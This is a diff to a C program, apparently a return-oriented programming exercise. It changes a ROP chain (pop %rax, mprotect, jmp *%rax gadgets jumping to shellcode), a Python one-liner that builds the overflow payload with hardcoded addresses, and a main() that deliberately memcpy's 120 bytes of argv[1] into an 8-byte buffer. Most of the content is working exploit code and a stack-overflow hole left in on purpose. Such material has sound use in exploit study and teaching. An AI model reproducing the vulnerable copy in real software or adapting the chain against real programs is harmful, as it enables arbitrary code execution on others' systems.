@@ -30,9 +30,15 @@ char shellcode2[] =
 // +--------------------+
 // |<addr of pop %rax>	|
 // +--------------------+
+// |<addr of mprotect>	|
+// +--------------------+
 // |<addr of jmp *%rax> |
 // +--------------------+
-// |<addr of test>		|
+// |<addr of pop %rax>	|
+// +--------------------+
+// |<addr of shellcode2>|
+// +--------------------+
+// |<addr of jmp *%rax>	|
 // +--------------------+
 // |					|
 // |					|
@@ -49,14 +55,16 @@ Argument : "$(python -c 'print   "A"*16
 								 +"\x58\xd8\xa5\xf7\xff\x7f\x20\x20"
 								 +"\x20\x9a\xb0\xf7\xff\x7f\x20\x20"
 								 +"\xb3\xd8\xbb\xf7\xff\x7f\x20\x20"
-								 +"\xb7\x06\x40\x20\x20\x20\x20\x20"
+								 +"\x58\xd8\xa5\xf7\xff\x7f\x20\x20"
+								 +"\x60\x10\x60\x20\x20\x20\x20\x20"
+								 +"\xb3\xd8\xbb\xf7\xff\x7f\x20\x20"
 								 ')"
 */
 
 int main(int argc,char **argv)
 {
 	char buffer[8];
-	memcpy(buffer,argv[1],104);
+	memcpy(buffer,argv[1],120);
 	memset(buffer+30,0,3);
 	memset(buffer+34,0,6);
 	memset(buffer+46,0,2);
@@ -66,12 +74,7 @@ int main(int argc,char **argv)
 	memset(buffer+78,0,2);
 	memset(buffer+86,0,2);
 	memset(buffer+94,0,2);
-	memset(buffer+99,0,5);
-}
-
-void test()
-{
-	void (*funcptr)();
-	funcptr = shellcode2;
-	(*funcptr)();
+	memset(buffer+102,0,2);
+	memset(buffer+107,0,5);
+	memset(buffer+118,0,2);
 }
